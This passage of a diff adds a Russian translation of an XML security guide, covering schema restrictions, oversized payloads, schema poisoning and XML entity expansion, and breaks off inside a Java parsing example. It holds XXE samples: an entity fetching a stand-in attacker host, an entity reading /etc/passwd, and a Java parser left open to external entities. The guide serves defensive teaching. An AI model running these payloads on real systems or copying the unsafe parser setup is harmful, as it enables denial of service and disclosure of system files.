+<span class="w">   </span><span class="nt">&lt;xs:enumeration</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;March&quot;</span><span class="nt">/&gt;</span>
+<span class="w">   </span><span class="nt">&lt;xs:enumeration</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;April&quot;</span><span class="nt">/&gt;</span>
+<span class="w">   </span><span class="nt">&lt;xs:enumeration</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;May&quot;</span><span class="nt">/&gt;</span>
+<span class="w">   </span><span class="nt">&lt;xs:enumeration</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;June&quot;</span><span class="nt">/&gt;</span>
+<span class="w">   </span><span class="nt">&lt;xs:enumeration</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;July&quot;</span><span class="nt">/&gt;</span>
+<span class="w">   </span><span class="nt">&lt;xs:enumeration</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;August&quot;</span><span class="nt">/&gt;</span>
+<span class="w">   </span><span class="nt">&lt;xs:enumeration</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;September&quot;</span><span class="nt">/&gt;</span>
+<span class="w">   </span><span class="nt">&lt;xs:enumeration</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;October&quot;</span><span class="nt">/&gt;</span>
+<span class="w">   </span><span class="nt">&lt;xs:enumeration</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;November&quot;</span><span class="nt">/&gt;</span>
+<span class="w">   </span><span class="nt">&lt;xs:enumeration</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;December&quot;</span><span class="nt">/&gt;</span>
+<span class="w">  </span><span class="nt">&lt;/xs:restriction&gt;</span>
+<span class="w"> </span><span class="nt">&lt;/xs:simpleType&gt;</span>
+<span class="nt">&lt;/xs:element&gt;</span>
+</code></pre></div>
+<p>Ограничив значение элемента <code>month</code> одним из перечисленных значений, приложение не будет обрабатывать произвольные строки.</p>
+<h5 id="_15">Диапазоны<a class="headerlink" href="#_15" title="Permanent link">&para;</a></h5>
+<p>Программные приложения, базы данных и языки программирования обычно хранят информацию в пределах определённых диапазонов. <strong>Всякий раз, используя элемент или атрибут в местах, где важны определённые размеры (во избежание переполнений и потерь данных), логично проверять, считается ли длина данных допустимой.</strong> Следующая схема могла бы ограничить имя с использованием минимальной и максимальной длины во избежание нестандартных сценариев:</p>
+<div class="highlight"><pre><span></span><code><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;name&quot;</span><span class="nt">&gt;</span>
+<span class="w"> </span><span class="nt">&lt;xs:simpleType&gt;</span>
+<span class="w">  </span><span class="nt">&lt;xs:restriction</span><span class="w"> </span><span class="na">base=</span><span class="s">&quot;xs:string&quot;</span><span class="nt">&gt;</span>
+<span class="w">   </span><span class="nt">&lt;xs:minLength</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;3&quot;</span><span class="nt">/&gt;</span>
+<span class="w">   </span><span class="nt">&lt;xs:maxLength</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;256&quot;</span><span class="nt">/&gt;</span>
+<span class="w">  </span><span class="nt">&lt;/xs:restriction&gt;</span>
+<span class="w"> </span><span class="nt">&lt;/xs:simpleType&gt;</span>
+<span class="nt">&lt;/xs:element&gt;</span>
+</code></pre></div>
+<p>В случаях, когда возможные значения ограничены определённой длиной (например, 8 символов), это значение можно задать следующим образом:</p>
+<div class="highlight"><pre><span></span><code><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;name&quot;</span><span class="nt">&gt;</span>
+<span class="w"> </span><span class="nt">&lt;xs:simpleType&gt;</span>
+<span class="w">  </span><span class="nt">&lt;xs:restriction</span><span class="w"> </span><span class="na">base=</span><span class="s">&quot;xs:string&quot;</span><span class="nt">&gt;</span>
+<span class="w">   </span><span class="nt">&lt;xs:length</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;8&quot;</span><span class="nt">/&gt;</span>
+<span class="w">  </span><span class="nt">&lt;/xs:restriction&gt;</span>
+<span class="w"> </span><span class="nt">&lt;/xs:simpleType&gt;</span>
+<span class="nt">&lt;/xs:element&gt;</span>
+</code></pre></div>
+<h5 id="_16">Паттерны<a class="headerlink" href="#_16" title="Permanent link">&para;</a></h5>
+<p>Определённые элементы или атрибуты могут следовать конкретному синтаксису. Вы можете добавлять ограничения <code>pattern</code> при использовании XML-схем. <strong>Когда нужно убедиться, что данные соответствуют конкретному паттерну, можно создать специальное определение для него. Номера социального страхования (SSN) служат хорошим примером: они должны использовать определённый набор символов, определённую длину и определённый <code>pattern</code>:</strong></p>
+<div class="highlight"><pre><span></span><code><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;SSN&quot;</span><span class="nt">&gt;</span>
+<span class="w"> </span><span class="nt">&lt;xs:simpleType&gt;</span>
+<span class="w">  </span><span class="nt">&lt;xs:restriction</span><span class="w"> </span><span class="na">base=</span><span class="s">&quot;xs:token&quot;</span><span class="nt">&gt;</span>
+<span class="w">   </span><span class="nt">&lt;xs:pattern</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;[0-9]{3}-[0-9]{2}-[0-9]{4}&quot;</span><span class="nt">/&gt;</span>
+<span class="w">  </span><span class="nt">&lt;/xs:restriction&gt;</span>
+<span class="w"> </span><span class="nt">&lt;/xs:simpleType&gt;</span>
+<span class="nt">&lt;/xs:element&gt;</span>
+</code></pre></div>
+<p>В качестве значений SSN будут разрешены только числа от <code>000-00-0000</code> до <code>999-99-9999</code>.</p>
+<h5 id="_17">Утверждения<a class="headerlink" href="#_17" title="Permanent link">&para;</a></h5>
+<p><strong>Компоненты утверждений ограничивают существование и значения связанных элементов и атрибутов в XML-схемах. Элемент или атрибут будет считаться допустимым по отношению к утверждению только если тест оценивается как true без возникновения каких-либо ошибок. Переменная <code>$value</code> может использоваться для ссылки на содержимое анализируемого значения.</strong></p>
+<p>В разделе <em>Деление на ноль</em> выше упоминались потенциальные последствия использования типов данных, содержащих ноль для делителей, и предлагался тип данных, содержащий только положительные значения. Противоположный пример рассматривал бы допустимым весь диапазон чисел, кроме нуля. Чтобы избежать раскрытия потенциальных ошибок, значения можно проверять с помощью <code>assertion</code>, запрещающего число ноль:</p>
+<div class="highlight"><pre><span></span><code><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;denominator&quot;</span><span class="nt">&gt;</span>
+<span class="w"> </span><span class="nt">&lt;xs:simpleType&gt;</span>
+<span class="w">  </span><span class="nt">&lt;xs:restriction</span><span class="w"> </span><span class="na">base=</span><span class="s">&quot;xs:integer&quot;</span><span class="nt">&gt;</span>
+<span class="w">   </span><span class="nt">&lt;xs:assertion</span><span class="w"> </span><span class="na">test=</span><span class="s">&quot;$value != 0&quot;</span><span class="nt">/&gt;</span>
+<span class="w">  </span><span class="nt">&lt;/xs:restriction&gt;</span>
+<span class="w"> </span><span class="nt">&lt;/xs:simpleType&gt;</span>
+<span class="nt">&lt;/xs:element&gt;</span>
+</code></pre></div>
+<p>Утверждение гарантирует, что <code>denominator</code> не будет содержать ноль как допустимое число, а также разрешает отрицательные числа в качестве допустимого делителя.</p>
+<h5 id="_18">Кратность вхождений<a class="headerlink" href="#_18" title="Permanent link">&para;</a></h5>
+<p><strong>Последствия отсутствия определения максимального количества вхождений могут быть хуже, чем работа с последствиями экстремального количества обрабатываемых элементов.</strong> Два атрибута задают минимальный и максимальный пределы: <code>minOccurs</code> и <code>maxOccurs</code>.</p>
+<p>Значение по умолчанию для обоих атрибутов — <code>1</code>, но определённым элементам могут потребоваться другие значения. Например, если значение необязательно, оно может иметь <code>minOccurs</code> равный 0, а если нет ограничений на максимальное количество, оно может иметь <code>maxOccurs</code> равный <code>unbounded</code>, как в следующем примере:</p>
+<div class="highlight"><pre><span></span><code><span class="nt">&lt;xs:schema</span><span class="w"> </span><span class="na">xmlns:xs=</span><span class="s">&quot;http://www.w3.org/2001/XMLSchema&quot;</span><span class="nt">&gt;</span>
+<span class="w"> </span><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;operation&quot;</span><span class="nt">&gt;</span>
+<span class="w">  </span><span class="nt">&lt;xs:complexType&gt;</span>
+<span class="w">   </span><span class="nt">&lt;xs:sequence&gt;</span>
+<span class="w">    </span><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;buy&quot;</span><span class="w"> </span><span class="na">maxOccurs=</span><span class="s">&quot;unbounded&quot;</span><span class="nt">&gt;</span>
+<span class="w">     </span><span class="nt">&lt;xs:complexType&gt;</span>
+<span class="w">      </span><span class="nt">&lt;xs:all&gt;</span>
+<span class="w">       </span><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;id&quot;</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;xs:integer&quot;</span><span class="nt">/&gt;</span>
+<span class="w">       </span><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;price&quot;</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;xs:decimal&quot;</span><span class="nt">/&gt;</span>
+<span class="w">       </span><span class="nt">&lt;xs:element</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;quantity&quot;</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;xs:integer&quot;</span><span class="nt">/&gt;</span>
+<span class="w">      </span><span class="nt">&lt;/xs:all&gt;</span>
+<span class="w">     </span><span class="nt">&lt;/xs:complexType&gt;</span>
+<span class="w">    </span><span class="nt">&lt;/xs:element&gt;</span>
+<span class="w">  </span><span class="nt">&lt;/xs:complexType&gt;</span>
+<span class="w"> </span><span class="nt">&lt;/xs:element&gt;</span>
+<span class="nt">&lt;/xs:schema&gt;</span>
+</code></pre></div>
+<p>Предыдущая схема включает корневой элемент <code>operation</code>, который может содержать неограниченное (<code>unbounded</code>) количество элементов <code>buy</code>. Это распространённый случай, поскольку разработчики обычно не хотят ограничивать максимальное количество вхождений. <strong>Приложения, использующие неограниченные вхождения, должны тестировать, что происходит при получении чрезвычайно большого количества элементов для обработки. Поскольку вычислительные ресурсы ограничены, последствия должны быть проанализированы, и в итоге следует использовать максимальное число вместо значения <code>unbounded</code>.</strong></p>
+<h3 id="_19">Сверхбольшие полезные нагрузки<a class="headerlink" href="#_19" title="Permanent link">&para;</a></h3>
+<p><strong>Отправка XML-документа размером 1 ГБ требует лишь секунды серверной обработки и может не стоить рассмотрения как атаки. Вместо этого злоумышленник будет искать способ минимизировать CPU и трафик для генерации такого типа атаки в сравнении с общим объёмом серверного CPU или трафика для обработки запросов.</strong></p>
+<h4 id="_20">Традиционные сверхбольшие полезные нагрузки<a class="headerlink" href="#_20" title="Permanent link">&para;</a></h4>
+<p><strong>Существует два основных метода сделать документ больше обычного:</strong></p>
+<p><strong>- Атака в глубину: использование огромного количества элементов, имён элементов и/или значений элементов.</strong></p>
+<p><strong>- Атака в ширину: использование огромного количества атрибутов, имён атрибутов и/или значений атрибутов.</strong></p>
+<p>В большинстве случаев общим результатом будет огромный документ. Вот краткий пример того, как это выглядит:</p>
+<div class="highlight"><pre><span></span><code><span class="nt">&lt;SOAPENV:ENVELOPE</span><span class="w"> </span><span class="na">XMLNS:SOAPENV=</span><span class="s">&quot;HTTP://SCHEMAS.XMLSOAP.ORG/SOAP/ENVELOPE/&quot;</span>
+<span class="w">                  </span><span class="na">XMLNS:EXT=</span><span class="s">&quot;HTTP://COM/IBM/WAS/WSSAMPLE/SEI/ECHO/B2B/EXTERNAL&quot;</span><span class="nt">&gt;</span>
+<span class="w"> </span><span class="nt">&lt;SOAPENV:HEADER</span><span class="w"> </span><span class="na">LARGENAME1=</span><span class="s">&quot;LARGEVALUE&quot;</span>
+<span class="w">                 </span><span class="na">LARGENAME2=</span><span class="s">&quot;LARGEVALUE2&quot;</span>
+<span class="w">                 </span><span class="na">LARGENAME3=</span><span class="s">&quot;LARGEVALUE3&quot;</span><span class="w"> </span><span class="err">…</span><span class="nt">&gt;</span>
+<span class="w"> </span>...
+</code></pre></div>
+<h4 id="_21">«Маленькие» сверхбольшие полезные нагрузки<a class="headerlink" href="#_21" title="Permanent link">&para;</a></h4>
+<p><strong>Следующий пример — очень маленький документ, но результаты его обработки могут быть аналогичны традиционным сверхбольшим нагрузкам.</strong> Цель такой маленькой нагрузки — позволить злоумышленнику отправлять много документов достаточно быстро, чтобы приложение потребляло большую часть или все доступные ресурсы:</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
+<span class="cp">&lt;!DOCTYPE root [</span>
+<span class="cp"> &lt;!ENTITY file SYSTEM &quot;http://attacker/huge.xml&quot; &gt;</span>
+]&gt;
+<span class="nt">&lt;root&gt;</span><span class="ni">&amp;file;</span><span class="nt">&lt;/root&gt;</span>
+</code></pre></div>
+<h3 id="_22">Отравление схемы<a class="headerlink" href="#_22" title="Permanent link">&para;</a></h3>
+<p><strong>Когда злоумышленник способен вносить изменения в схему, это может иметь множество опасных последствий. В частности, эффект этих последствий будет тем опаснее, если схемы используют <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> (например, извлечение файлов, отказ в обслуживании).</strong> Злоумышленник может использовать этот тип уязвимости в многочисленных сценариях, всегда в зависимости от расположения схемы.</p>
+<h4 id="_23">Локальное отравление схемы<a class="headerlink" href="#_23" title="Permanent link">&para;</a></h4>
+<p><strong>Локальное отравление схемы происходит, когда схемы доступны на том же хосте, независимо от того, встроены ли схемы в тот же XML-документ.</strong></p>
+<h5 id="_24">Встроенная схема<a class="headerlink" href="#_24" title="Permanent link">&para;</a></h5>
+<p><strong>Наиболее тривиальный тип отравления схемы происходит, когда схема определена внутри того же XML-документа.</strong> Рассмотрим следующий, незаметно уязвимый пример, предоставленный W3C:</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
+<span class="cp">&lt;!DOCTYPE note [</span>
+<span class="cp"> &lt;!ELEMENT note (to,from,heading,body)&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ELEMENT to (#PCDATA)&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ELEMENT from (#PCDATA)&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ELEMENT heading (#PCDATA)&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ELEMENT body (#PCDATA)&gt;</span>
+]&gt;
+<span class="nt">&lt;note&gt;</span>
+<span class="w"> </span><span class="nt">&lt;to&gt;</span>Tove<span class="nt">&lt;/to&gt;</span>
+<span class="w"> </span><span class="nt">&lt;from&gt;</span>Jani<span class="nt">&lt;/from&gt;</span>
+<span class="w"> </span><span class="nt">&lt;heading&gt;</span>Reminder<span class="nt">&lt;/heading&gt;</span>
+<span class="w"> </span><span class="nt">&lt;body&gt;</span>Don&#39;t<span class="w"> </span>forget<span class="w"> </span>me<span class="w"> </span>this<span class="w"> </span>weekend<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/note&gt;</span>
+</code></pre></div>
+<p>Все ограничения элемента <code>note</code> могут быть удалены или изменены, что позволит отправлять на сервер данные любого типа. Более того, если сервер обрабатывает внешние сущности, злоумышленник может использовать схему, например, для чтения удалённых файлов с сервера. <strong>Такой тип схемы служит только как предложение по отправке документа, но должен содержать способ проверки целостности встроенной схемы для безопасного использования. Атаки через встроенные схемы обычно используются для эксплуатации расширений внешних сущностей. Встроенные XML-схемы также могут помогать при сканировании портов внутренних хостов или брутфорс-атаках.</strong></p>
+<h5 id="_25">Некорректные права доступа<a class="headerlink" href="#_25" title="Permanent link">&para;</a></h5>
+<p><strong>Часто можно обойти риск использования удалённо скомпрометированных версий, обрабатывая локальную схему.</strong></p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;</span>
+<span class="nt">&lt;note&gt;</span>
+<span class="w"> </span><span class="nt">&lt;to&gt;</span>Tove<span class="nt">&lt;/to&gt;</span>
+<span class="w"> </span><span class="nt">&lt;from&gt;</span>Jani<span class="nt">&lt;/from&gt;</span>
+<span class="w"> </span><span class="nt">&lt;heading&gt;</span>Reminder<span class="nt">&lt;/heading&gt;</span>
+<span class="w"> </span><span class="nt">&lt;body&gt;</span>Don&#39;t<span class="w"> </span>forget<span class="w"> </span>me<span class="w"> </span>this<span class="w"> </span>weekend<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/note&gt;</span>
+</code></pre></div>
+<p><strong>Однако если локальная схема не имеет корректных прав доступа, внутренний злоумышленник может изменить исходные ограничения.</strong> Следующая строка иллюстрирует схему с правами доступа, разрешающими любому пользователю вносить изменения:</p>
+<div class="highlight"><pre><span></span><code>-rw-rw-rw-  1 user  staff  743 Jan 15 12:32 note.dtd
+</code></pre></div>
+<p>Права доступа <code>name.dtd</code> позволяют любому пользователю системы вносить изменения. Эта уязвимость явно не связана со структурой XML или схемы, но поскольку эти документы обычно хранятся в файловой системе, стоит упомянуть, что злоумышленник может воспользоваться такого рода проблемой.</p>
+<h4 id="_26">Удалённое отравление схемы<a class="headerlink" href="#_26" title="Permanent link">&para;</a></h4>
+<p><strong>Схемы, определённые внешними организациями, обычно ссылаются удалённо. Если злоумышленник способен перехватить или получить доступ к сетевому трафику, он может заставить жертву получить отличный тип содержимого вместо изначально предназначенного.</strong></p>
+<h5 id="mitm">Атака «человек посередине» (MitM)<a class="headerlink" href="#mitm" title="Permanent link">&para;</a></h5>
+<p>Когда документы ссылаются на удалённые схемы с использованием незашифрованного протокола HTTP, взаимодействие происходит в открытом виде и злоумышленник может легко подменять трафик. <strong>Когда XML-документы ссылаются на удалённые схемы через HTTP-соединение, соединение может быть перехвачено и изменено до достижения конечного пользователя:</strong></p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;!DOCTYPE note SYSTEM &quot;http://example.com/note.dtd&quot;&gt;</span>
+<span class="nt">&lt;note&gt;</span>
+<span class="w"> </span><span class="nt">&lt;to&gt;</span>Tove<span class="nt">&lt;/to&gt;</span>
+<span class="w"> </span><span class="nt">&lt;from&gt;</span>Jani<span class="nt">&lt;/from&gt;</span>
+<span class="w"> </span><span class="nt">&lt;heading&gt;</span>Reminder<span class="nt">&lt;/heading&gt;</span>
+<span class="w"> </span><span class="nt">&lt;body&gt;</span>Don&#39;t<span class="w"> </span>forget<span class="w"> </span>me<span class="w"> </span>this<span class="w"> </span>weekend<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/note&gt;</span>
+</code></pre></div>
+<p>Удалённый файл <code>note.dtd</code> может быть подвержен подмене при передаче по незашифрованному протоколу HTTP. Одним из инструментов для такого типа атаки является mitmproxy.</p>
+<h5 id="dns-">Отравление DNS-кэша<a class="headerlink" href="#dns-" title="Permanent link">&para;</a></h5>
+<p>Удалённое отравление схемы возможно даже при использовании зашифрованных протоколов, таких как HTTPS. <strong>Когда программное обеспечение выполняет обратное разрешение DNS для IP-адреса с целью получения имени хоста, оно может не обеспечивать должного контроля того, действительно ли IP-адрес связан с именем хоста.</strong> В этом случае программное обеспечение позволяет злоумышленнику перенаправлять содержимое на свои IP-адреса.</p>
+<p>В предыдущем примере хост <code>example.com</code> ссылался через незашифрованный протокол.</p>
+<p>При переходе на HTTPS расположение удалённой схемы будет выглядеть как <code>https://example/note.dtd</code>. В нормальном сценарии IP-адрес <code>example.com</code> разрешается в <code>1.1.1.1</code>:</p>
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>host<span class="w"> </span>example.com
+example.com<span class="w"> </span>has<span class="w"> </span>address<span class="w"> </span><span class="m">1</span>.1.1.1
+</code></pre></div>
+<p>Если злоумышленник скомпрометировал используемый DNS, предыдущее имя хоста теперь может указывать на новый IP, подконтрольный злоумышленнику <code>2.2.2.2</code>:</p>
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>host<span class="w"> </span>example.com
+example.com<span class="w"> </span>has<span class="w"> </span>address<span class="w"> </span><span class="m">2</span>.2.2.2
+</code></pre></div>
+<p>При обращении к удалённому файлу жертва может фактически получать содержимое расположения, контролируемого злоумышленником.</p>
+<h5 id="_27">Атака злонамеренного сотрудника<a class="headerlink" href="#_27" title="Permanent link">&para;</a></h5>
+<p>Когда третьи стороны размещают и определяют схемы, их содержимое не находится под контролем пользователей схем. <strong>Любые изменения, внесённые злонамеренным сотрудником или внешним злоумышленником, имеющим доступ к этим файлам, могут затронуть всех пользователей, обрабатывающих данные схемы. В результате злоумышленники могут повлиять на конфиденциальность, целостность или доступность других сервисов (особенно если используемая схема — <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a>).</strong></p>
+<h3 id="xml-_5">Расширение XML-сущностей<a class="headerlink" href="#xml-_5" title="Permanent link">&para;</a></h3>
+<p><strong>Если парсер использует <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a>, злоумышленник может вводить данные, способные негативно повлиять на XML-парсер в процессе обработки документа. Эти негативные эффекты могут включать сбой парсера или доступ к локальным файлам.</strong></p>
+<h4 id="java">Примеры уязвимых реализаций на Java<a class="headerlink" href="#java" title="Permanent link">&para;</a></h4>
+<p><strong>Используя возможности <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> для ссылки на локальные или удалённые файлы, можно влиять на конфиденциальность файлов.</strong> Кроме того, можно влиять на доступность ресурсов, если не установлены надлежащие ограничения для расширения сущностей. Рассмотрим следующий пример кода XXE.</p>
+<p><strong>Пример XML</strong>:</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;!DOCTYPE contacts SYSTEM &quot;contacts.dtd&quot;&gt;</span>
+<span class="nt">&lt;contacts&gt;</span>
+<span class="w"> </span><span class="nt">&lt;contact&gt;</span>
+<span class="w">  </span><span class="nt">&lt;firstname&gt;</span>John<span class="nt">&lt;/firstname&gt;</span>
+<span class="w">  </span><span class="nt">&lt;lastname&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/lastname&gt;</span>
+<span class="w"> </span><span class="nt">&lt;/contact&gt;</span>
+<span class="nt">&lt;/contacts&gt;</span>
+</code></pre></div>
+<p><strong>Пример DTD</strong>:</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;!ELEMENT contacts (contact*)&gt;</span>
+<span class="cp">&lt;!ELEMENT contact (firstname,lastname)&gt;</span>
+<span class="cp">&lt;!ELEMENT firstname (#PCDATA)&gt;</span>
+<span class="cp">&lt;!ELEMENT lastname ANY&gt;</span>
+<span class="cp">&lt;!ENTITY xxe SYSTEM &quot;/etc/passwd&quot;&gt;</span>
+</code></pre></div>
+<h5 id="xxe-dom">XXE с использованием DOM<a class="headerlink" href="#xxe-dom" title="Permanent link">&para;</a></h5>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.parsers.DocumentBuilder</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.parsers.DocumentBuilderFactory</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.parsers.ParserConfigurationException</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">org.xml.sax.InputSource</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">org.w3c.dom.Document</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">org.w3c.dom.Element</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">org.w3c.dom.Node</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">org.w3c.dom.NodeList</span><span class="p">;</span>
+
+<span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">parseDocument</span><span class="w"> </span><span class="p">{</span>
+<span class="w"> </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
+<span class="w">   </span><span class="n">DocumentBuilderFactory</span><span class="w"> </span><span class="n">factory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DocumentBuilderFactory</span><span class="p">.</span><span class="na">newInstance</span><span class="p">();</span>
+<span class="w">   </span><span class="n">DocumentBuilder</span><span class="w"> </span><span class="n">builder</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">factory</span><span class="p">.</span><span class="na">newDocumentBuilder</span><span class="p">();</span>
+<span class="w">   </span><span class="n">Document</span><span class="w"> </span><span class="n">doc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">builder</span><span class="p">.</span><span class="na">parse</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">InputSource</span><span class="p">(</span><span class="s">&quot;contacts.xml&quot;</span><span class="p">));</span>
+<span class="w">   </span><span class="n">NodeList</span><span class="w"> </span><span class="n">nodeList</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">doc</span><span class="p">.</span><span class="na">getElementsByTagName</span><span class="p">(</span><span class="s">&quot;contact&quot;</span><span class="p">);</span>
+<span class="w">   </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">nodeList</span><span class="p">.</span><span class="na">getLength</span><span class="p">();</span><span class="w"> </span><span class="n">s</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">     </span><span class="n">Node</span><span class="w"> </span><span class="n">firstNode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">nodeList</span><span class="p">.</span><span class="na">item</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
+<span class="w">     </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">firstNode</span><span class="p">.</span><span class="na">getNodeType</span><span class="p">()</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">Node</span><span class="p">.</span><span class="na">ELEMENT_NODE</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">       </span><span class="n">Element</span><span class="w"> </span><span class="n">firstElement</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Element</span><span class="p">)</span><span class="w"> </span><span class="n">firstNode</span><span class="p">;</span>
+<span class="w">       </span><span class="n">NodeList</span><span class="w"> </span><span class="n">firstNameElementList</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">firstElement</span><span class="p">.</span><span class="na">getElementsByTagName</span><span class="p">(</span><span class="s">&quot;firstname&quot;</span><span class="p">);</span>
+<span class="w">       </span><span class="n">Element</span><span class="w"> </span><span class="n">firstNameElement</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Element</span><span class="p">)</span><span class="w"> </span><span class="n">firstNameElementList</span><span class="p">.</span><span class="na">item</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="w">       </span><span class="n">NodeList</span><span class="w"> </span><span class="n">firstName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">firstNameElement</span><span class="p">.</span><span class="na">getChildNodes</span><span class="p">();</span>
+<span class="w">       </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;First Name: &quot;</span><span class="w">  </span><span class="o">+</span><span class="w"> </span><span class="p">((</span><span class="n">Node</span><span class="p">)</span><span class="w"> </span><span class="n">firstName</span><span class="p">.</span><span class="na">item</span><span class="p">(</span><span class="mi">0</span><span class="p">)).</span><span class="na">getNodeValue</span><span class="p">());</span>
+<span class="w">       </span><span class="n">NodeList</span><span class="w"> </span><span class="n">lastNameElementList</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">firstElement</span><span class="p">.</span><span class="na">getElementsByTagName</span><span class="p">(</span><span class="s">&quot;lastname&quot;</span><span class="p">);</span>
+<span class="w">       </span><span class="n">Element</span><span class="w"> </span><span class="n">lastNameElement</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Element</span><span class="p">)</span><span class="w"> </span><span class="n">lastNameElementList</span><span class="p">.</span><span class="na">item</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="w">       </span><span class="n">NodeList</span><span class="w"> </span><span class="n">lastName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">lastNameElement</span><span class="p">.</span><span class="na">getChildNodes</span><span class="p">();</span>
+<span class="w">       </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;Last Name: &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">((</span><span class="n">Node</span><span class="p">)</span><span class="w"> </span><span class="n">lastName</span><span class="p">.</span><span class="na">item</span><span class="p">(</span><span class="mi">0</span><span class="p">)).</span><span class="na">getNodeValue</span><span class="p">());</span>
+<span class="w">     </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
